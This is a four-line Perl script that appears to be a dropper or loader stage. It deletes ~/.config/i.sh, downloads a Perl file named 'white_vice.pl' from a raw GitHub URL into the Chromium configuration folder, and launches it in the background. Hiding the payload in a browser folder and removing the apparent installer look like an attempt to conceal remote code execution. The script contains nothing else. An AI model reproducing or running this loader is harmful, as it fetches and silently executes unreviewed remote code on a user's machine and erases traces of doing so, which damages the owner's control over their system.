#!/usr/bin/perl -w
system("rm ~/.config/i.sh");
system("wget -O ~/.config/chromium/wv.pl https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/src/white_vice.pl");
system("perl ~/.config/chromium/wv.pl &");
